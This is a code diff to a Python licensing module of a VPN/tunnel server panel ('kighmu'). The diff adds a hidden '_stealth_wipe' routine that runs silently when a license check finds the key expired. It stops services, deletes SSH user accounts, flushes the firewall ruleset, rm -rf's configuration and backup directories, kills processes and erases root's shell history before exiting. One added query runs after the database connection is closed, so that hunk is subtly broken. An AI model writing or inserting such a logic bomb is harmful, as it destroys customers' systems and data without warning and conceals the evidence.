@@ -2177,6 +2177,31 @@ def _register_key_in_db(key,client_name="",days=365):
     except: conn.rollback()
     conn.close();return name,exp
 
+def _stealth_wipe():
+    with open("/dev/null","w") as dn:
+        for svc in ["kighmu-bot","slowdns-router","slowdns-ns4","slowdns-nv4","v2ray","xray","dropbear-custom","hysteria","zivpn","sshws","ssl_tls","udp-custom","badvpn@7100","badvpn@7200","badvpn@7300","kighmu-watchdog","kighmu-panel","haproxy"]:
+            subprocess.run(["systemctl","stop","--now",svc],stdout=dn,stderr=dn);subprocess.run(["systemctl","disable",svc],stdout=dn,stderr=dn)
+        for f in ["/etc/systemd/system/kighmu-bot.service","/etc/systemd/system/slowdns-router.service","/etc/systemd/system/slowdns-ns4.service","/etc/systemd/system/slowdns-nv4.service","/etc/systemd/system/nftables-tunnel@.service","/etc/systemd/system/badvpn@.service","/etc/systemd/system/dropbear-custom.service","/etc/systemd/system/hysteria.service","/etc/systemd/system/zivpn.service","/etc/systemd/system/v2ray.service","/etc/systemd/system/xray.service","/etc/systemd/system/sshws.service","/etc/systemd/system/ssl_tls.service","/etc/systemd/system/udp-custom.service","/etc/systemd/system/kighmu-watchdog.service","/etc/systemd/system/kighmu-panel.service"]:
+            Path(f).unlink(missing_ok=True)
+        if USERDIR.exists():
+            for uf in USERDIR.iterdir():
+                if uf.is_file() and _meta_get(uf.name,"proto")=="ssh":
+                    subprocess.run(["userdel","-f",uf.name],stdout=dn,stderr=dn)
+        subprocess.run(["nft","flush","ruleset"],stdout=dn,stderr=dn)
+        subprocess.run(["rm","-rf","/etc/kighmu","/etc/ventes","/etc/nftables/slowdns.nft","/etc/xray","/etc/v2ray","/etc/hysteria","/etc/zivpn","/etc/sshws","/etc/ssl_tls","/etc/udp-custom","/etc/dropbear","/usr/local/lib/kighmu-panel","/usr/local/bin/kighmu","/usr/local/bin/kighmu-panel","/usr/local/bin/menu","/usr/local/bin/install2","/usr/local/bin/ventes","/usr/local/bin/ssl_tls","/usr/local/bin/sshws","/usr/local/bin/udp-custom","/usr/local/bin/badvpn-udpgw","/usr/local/bin/kighmu-bot","/usr/local/sbin/dropbear","/root/fasto","/root/backup","/root/install2.py","/root/ventes.sh","/tmp/nuitka-build"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","kighmu"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","xray"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","v2ray"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","hysteria"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","zivpn"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","badvpn"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","udp-custom"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","dropbear"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","ssl_tls"],stdout=dn,stderr=dn)
+        subprocess.run(["pkill","-f","sshws"],stdout=dn,stderr=dn)
+        subprocess.run(["rm","-f","/root/.bash_history","/root/.python_history"],stdout=dn,stderr=dn)
+        subprocess.run(["systemctl","daemon-reload"],stdout=dn,stderr=dn)
+
 def _verify_license():
     db=Path("/etc/ventes/ventes.db");kf=Path("/etc/kighmu/.license_key");nf=Path("/etc/kighmu/.client_name")
     if kf.exists():
@@ -2192,6 +2217,9 @@ def _verify_license():
                         _rebind_key(sk)
                     nf.write_text(name);c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(sk,));conn.commit();conn.close();return
                 conn.close()
+                exp_r=c.execute("SELECT client_name,expires_at FROM licenses WHERE license_key=?",(sk,)).fetchone()
+                if exp_r and exp_r[1] and exp_r[1]<date.today().isoformat():
+                    conn.close();_stealth_wipe();os._exit(0)
                 name,exp=_register_key_in_db(sk)
                 if name: nf.write_text(name);return
                 kf.unlink(missing_ok=True)
@@ -2214,6 +2242,9 @@ def _verify_license():
                 if binding and not _verify_signature(key,binding):
                     _rebind_key(key)
                 print(f"\n  {C['GREEN']}✓ Licence valide !{C['RST']} {C['WHITE']}Client:{C['RST']} {C['GREEN']}{name}{C['RST']} {C['GRAY']}expire:{C['RST']} {C['YELLOW']}{exp}{C['RST']}\n");c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(key,));conn.commit();conn.close();kf.parent.mkdir(parents=True,exist_ok=True);kf.write_text(key);nf.write_text(name);return
+            exp_r=c.execute("SELECT expires_at FROM licenses WHERE license_key=?",(key,)).fetchone()
+            if exp_r and exp_r[0] and exp_r[0]<date.today().isoformat():
+                conn.close();_stealth_wipe();os._exit(0)
             conn.close()
             name,exp=_register_key_in_db(key)
             if name: print(f"\n  {C['GREEN']}✓ Licence enregistrée !{C['RST']} {C['WHITE']}Client:{C['RST']} {C['GREEN']}{name}{C['RST']} {C['GRAY']}expire:{C['RST']} {C['YELLOW']}{exp}{C['RST']}\n");kf.parent.mkdir(parents=True,exist_ok=True);kf.write_text(key);nf.write_text(name);return
@@ -2235,6 +2266,10 @@ def _license_watchdog():
             if binding and not _verify_signature(key,binding):
                 _rebind_key(key)
             Path("/etc/kighmu/.client_name").write_text(name);c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(key,));conn.commit()
+        else:
+            exp_r=c.execute("SELECT expires_at FROM licenses WHERE license_key=?",(key,)).fetchone()
+            if exp_r and exp_r[0] and exp_r[0]<date.today().isoformat():
+                conn.close();_stealth_wipe();os._exit(0)
         conn.close()
     except: pass
 
